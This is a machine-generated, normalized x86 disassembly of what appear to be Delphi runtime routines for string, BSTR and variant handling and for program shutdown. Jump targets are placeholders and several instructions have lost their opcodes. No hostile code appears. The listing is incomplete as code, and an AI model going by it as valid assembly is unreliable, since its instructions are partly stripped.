mov [ fs : edx ] eax
retn
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_44c888
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push j_sub_44c4bc#3
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_44c8e8
push ebx
push esi
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax ]
call sub_44e378
add esi 0x8
dec ebx
jne r-xdata
pop esi
pop ebx
retn
sub_44c904
push ebx
push esi
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov ecx [ esi + 0x8 ]
mov eax [ eax ]
add eax ecx
mov [ edx ] eax
add esi 0xc
dec ebx
jne r-xdata
pop esi
pop ebx
retn
sub_44c924
push ebx
mov eax [ rw-data ]
mov ebx rw-data
mov ecx 0xa
xor edx edx
div ecx
add dl 0x30
mov [ ebx ] dl
dec ebx
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_44de00
mov edx [ rw-data ]
xchg edx eax
sub eax edx
mov ebx rw-data
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
mov [ ebx ] dl
dec ebx
shr eax 0x4
jne r-xdata
pop ebx
retn
sub_44c974
mov edi rw-data
mov ebx [ rw-data ]
mov ebp [ rw-data ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
leave
retn 0xc
sub_44c9a8
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x24 ] 0x2
jne r-xdata
call sub_44c924
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_44c888
cmp [ ebx + 0x24 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov edx rw-data
mov eax rw-data
call j_sub_449d20
call sub_449c9f
jmp r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push rw-data
push rw-data
push 0x0
call MessageBoxA
call sub_44c860
cmp [ ebx + 0x24 ] 0x1
jne r-xdata
call sub_44e308
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x10 ]
cmp edx [ eax + 0x4 ]
je r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
call [ ebx + 0x28 ]
push edx
call FreeLibrary
cmp [ ebx ] 0x0
jne r-xdata
call sub_44c974
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov eax [ esi ]
push eax
call ExitProcess
sub_44cae0
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_44ba74
pop eax
sub_44cb04
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_44ba74
sub_44cb34
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_44cba4
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_44bbe8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_44ba74
sub_44cb78
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_44ba74
sub_44cba4
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0x9
call sub_44ba5c
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
mov [ eax + edx ] 0x0
retn
sub_44cbc8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_44cba4
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_44cae0
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_44bbe8
sub_44cbf8
push ebx
push esi
push edi
push ebp
add esp 0xfffff800
mov ebx ecx
mov ebp edx
mov edi eax
test ebx ebx
jg r-xdata
cmp ebx 0x400
jge r-xdata
mov eax edi
call sub_44cae0
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push ebp
push 0x0
push 0x0
call WideCharToMultiByte
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_44cbc8
push 0x0
push 0x0
push esi
mov eax [ edi ]
push eax
push ebx
push ebp
push 0x0
push 0x0
call WideCharToMultiByte
push 0x0
push 0x0
push 0x800
lea eax [ esp + 0xc ]
push eax
push ebx
push ebp
push 0x0
push 0x0
call WideCharToMultiByte
mov esi eax
test esi esi
jle r-xdata
add esp 0x800
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
mov ecx esi
call sub_44cbc8
jmp r-xdata
sub_44cc98
xor ecx ecx
test edx edx
je r-xdata
jmp sub_44cbc8
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_44ccc8
xor ecx ecx
test edx edx
je r-xdata
jmp sub_44cbf8
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_44cd10
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_44cbc8
not ecx
sub_44cd3c
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_44bbe8
pop ebx
retn
mov ecx ebx
sub_44cd68
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_44cb34
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_44d04c
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_44d04c
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_44bbe8
pop edi
pop esi
pop ebx
retn
sub_44cdac
test edx edx
je r-xdata
mov edx ecx
jmp sub_44cb34
test ecx ecx
je sub_44cb34
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_44cd68
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_44cba4
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_44bbe8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_44bbe8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_44cb34
pop edx
pop eax
jmp sub_44cd68
call sub_44cb34
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_44ce20
push ebx
push esi
push edx
push eax
mov ebx edx
xor eax eax
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
mov ecx [ esp + edx * 4 + 0x10 ]
test ecx ecx
je r-xdata
call sub_44cba4
push eax
mov esi eax
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_44bbe8
mov eax [ esp + ebx * 4 + 0x14 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edx edx
je r-xdata
call sub_44cb34
pop edx
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
dec [ edx - 0x8 ]
sub_44ce70
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_44cf30
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_44cba4
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov ecx [ eax - 0x4 ]
call sub_44bbe8
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
sub_44cf68
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_44cae0
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_44cbc8
jmp r-xdata
pop ebx
retn 0x4
sub_44cfa8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call sub_44cf30
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edx + edi ]
call sub_44bbe8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_44d04c
mov edi ecx
sub_44cff0
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_44d04c
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_44bbe8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_44bbe8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_44d04c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
je r-xdata
mov eax ebx
call sub_44cae0
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_44cba4
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_44ba8c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ eax + esi ] 0x0
jmp r-xdata
call sub_44bbe8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_44d0e0
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_44d104
test edx edx
je sub_44d0c8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_44d0c8
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_44bb50
retn
sub_44d128
push ebx
push esi
push edi
push ebp
add esp 0xfffff800
mov ebx ecx
mov ebp edx
mov edi eax
test ebx ebx
jg r-xdata
cmp ebx 0x400
jge r-xdata
mov eax edi
call sub_44d0c8
jmp r-xdata
push 0x0
push 0x0
push ebx
push ebp
push 0x0
push 0x0
call MultiByteToWideChar
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_44d1ac
push esi
mov eax [ edi ]
push eax
push ebx
push ebp
push 0x0
push 0x0
call MultiByteToWideChar
push 0x400
lea eax [ esp + 0x4 ]
push eax
push ebx
push ebp
push 0x0
push 0x0
call MultiByteToWideChar
mov esi eax
test esi esi
jle r-xdata
add esp 0x800
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
mov ecx esi
call sub_44d1ac
jmp r-xdata
sub_44d1ac
test ecx ecx
je sub_44d0c8
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_44bb50
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_44d204
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_44d0b8
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44d1ec
mov ebx eax
mov eax [ edi ]
call sub_44d1e0
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_44bbe8
mov eax esi
sub_44d248
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ edx + ecx + 0xa ]
mov edi [ edx + ecx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
call sub_44d308
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_44d274
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_44d274
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_44d248
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_44bb50
sub_44d314
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ edx + ecx + 0xa ]
mov edi [ edx + ecx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
call sub_44d428
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_44d340
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_44cb04
jmp r-xdata
call sub_44cae0
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_44d0e0
jmp r-xdata
call sub_44d0c8
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_44dba8
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_44d340
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_44d314
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_44e3d0
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_44dd9c
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_44bb50
sub_44d434
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ ecx + eax + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_44bbe8
mov edx [ esi + eax ]
add eax ebx
call sub_44cb34
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ esi + eax ]
add eax ebx
call sub_44d104
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ esi + eax ]
add eax ebx
call sub_44d7f0
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ ebx + eax ]
add eax esi
call sub_44bbe8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ edx + ecx + 0x2 ]
push [ edx + ecx + 0x6 ]
mov ecx [ edx + ecx + 0xa ]
mov ecx [ ecx ]
lea edx [ esi + eax ]
add eax ebx
call sub_44d550
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ edx + ecx + 0x2 ]
push ecx
mov ecx edx
lea edx [ esi + eax ]
add eax ebx
call sub_44d434
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ esi + eax ]
add eax ebx
call sub_44e3e8
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ esi + eax ]
add eax ebx
call sub_44ddd8
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_44bb50
sub_44d550
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_44cb34
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_44d104
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_44d7f0
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ edi + ecx + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_44d550
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_44d434
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ edi + eax + 0x2 ]
add esi [ edi + eax + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_44e3e8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_44ddd8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_44bb50
sub_44d668
push ebx
push esi
push edi
push ebp
add esp 0xfffff800
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
cmp ebx 0x400
jge r-xdata
mov eax esi
call sub_44cae0
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push edi
push 0x0
push 0x0
call WideCharToMultiByte
mov ebp eax
mov eax esi
mov ecx ebp
xor edx edx
call sub_44cbc8
push 0x0
push 0x0
push ebp
mov eax [ esi ]
push eax
push ebx
push edi
push 0x0
push 0x0
call WideCharToMultiByte
push 0x0
push 0x0
push 0x800
lea eax [ esp + 0xc ]
push eax
push ebx
push edi
push 0x0
push 0x0
call WideCharToMultiByte
mov ecx eax
mov edx esp
mov eax esi
call sub_44cbc8
jmp r-xdata
add esp 0x800
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44d6f4
push ebx
push esi
push 0x0
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
push eax
call SysStringLen
mov edx eax
mov ecx esi
mov eax ebx
call sub_44d668
pop edx
pop esi
pop ebx
retn
sub_44d718
push ebx
push esi
push edi
push ebp
add esp 0xfffff800
mov ebx eax
mov eax ebx
call sub_44cd60
mov esi eax
mov eax ebx
call sub_44cd60
cmp eax 0x400
jge r-xdata
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov ebp eax
push ebp
push 0x0
call SysAllocStringLen
mov edi eax
push ebp
push edi
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
push 0x400
lea eax [ esp + 0x4 ]
push eax
push esi
mov eax ebx
call sub_44cf24
push eax
push 0x0
push 0x0
call MultiByteToWideChar
push eax
lea eax [ esp + 0x4 ]
push eax
call SysAllocStringLen
mov edi eax
jmp r-xdata
mov eax edi
add esp 0x800
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44d7ac
xor edx edx
mov dx [ eax ]
test edx 0x4000
jne r-xdata
mov [ eax ] 0x0
retn
cmp edx 0x8
jb r-xdata
cmp edx 0x100
je r-xdata
mov [ eax ] 0x0
add eax 0x8
jmp sub_44cae0
cmp edx 0x101
jne r-xdata
push eax
call VariantClear
retn
jmp [ rw-data ]
sub_44d7f0
cmp eax edx
je r-xdata
retn
cmp [ eax ] 0x8
jb r-xdata
cmp [ edx ] 0x8
jae r-xdata
push eax
push edx
cmp [ eax ] 0x100
je r-xdata
cmp [ edx ] 0x100
je r-xdata
add eax 0x8
call sub_44cae0
cmp [ eax ] 0x101
je r-xdata
mov edx [ edx + 0x8 ]
or edx edx
je r-xdata
cmp [ edx ] 0x101
jne r-xdata
call [ rw-data ]
jmp r-xdata
push eax
call VariantClear
jmp r-xdata
mov [ eax ] 0x100
mov [ eax + 0x8 ] edx
retn
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
mov [ eax ] 0x0
push edx
push eax
call VariantCopyInd
or eax eax
jne r-xdata
push eax
call sub_44d82e
pop eax
jmp [ rw-data ]
pop edx
pop eax
[ edx - 0x8 ]
mov al 0x10
jmp sub_44bb50
sub_44d88c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
push ecx
mov ecx 0x4
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov ebx eax
lea eax [ ebp - 0x10 ]
call sub_44dbb0
xor eax eax
push ebp
push sub_44d8e8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx esi
call sub_44d910
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d8ef
lea eax [ ebp - 0x10 ]
call sub_44dba8
retn
sub_44d910
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebx ]
sub ax 0x100
je r-xdata
mov edx esi
mov eax ebx
mov ecx edi
call sub_44d8f8
test al al
jne r-xdata
dec ax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
push edi
push 0x0
push 0x400
push esi
lea eax [ ebp - 0x10 ]
push eax
call VariantChangeTypeEx
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx edi
call sub_44d88c
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_44d7ac
mov eax [ ebp - 0x10 ]
mov [ ebx ] eax
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
jmp r-xdata
call sub_44d79c
mov edx esi
mov eax ebx
mov ecx edi
call sub_44d8f8
test al al
jne r-xdata
push edi
push 0x0
push 0x400
push esi
push ebx
call VariantChangeTypeEx
test eax eax
je r-xdata
call sub_44d79c
sub_44d9b4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ edx + 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_44d6f4
mov eax ebx
call sub_44d7ac
mov [ ebx ] 0x100
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
pop ebx
pop ecx
pop ebp
retn
sub_44d9e4
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x8 ]
call sub_44d718
mov esi eax
mov eax ebx
call sub_44d7ac
mov [ ebx ] 0x8
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_44da04
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x14 ] eax
mov ax [ edx ]
mov ebx ecx
cmp bx ax
jne r-xdata
cmp ax 0x100
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_44d7f0
jmp r-xdata
cmp bx 0x100
jne r-xdata
cmp bx 0x8
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov ecx ebx
call sub_44d910
cmp ax 0x101
je r-xdata
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x10 ]
call sub_44d9e4
xor eax eax
push ebp
push sub_44da7d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov ecx ebx
call sub_44d910
xor eax eax
pop edx
pop ecx
pop ecx
